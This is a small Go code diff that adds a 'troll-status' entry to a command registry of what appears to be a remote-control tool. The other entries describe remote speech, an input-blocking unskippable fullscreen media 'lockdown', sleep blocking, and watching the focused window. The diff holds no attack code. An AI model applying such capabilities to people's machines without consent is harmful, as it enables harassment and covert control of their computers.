@@ -117,6 +117,7 @@ var Known = map[string]string{
 	"speak-stop":               "Stop remote speech",
 	"play-troll":               "Fullscreen unskippable media lockdown - play-troll <path|url> [seconds 1-3600] [noloop] (input blocked, auto-stops)",
 	"stop-troll":               "Stop troll player and unblock input",
+	"troll-status":             "Troll player state + last playback proof",
 	"keep-awake":               "Block sleep/lock on remote PC - keep-awake [on|off|status]",
 	"get-session-state":        "Locked/RDP state of remote session",
 	"get-foreground-window":    "Focused window on remote PC (where keys land)",
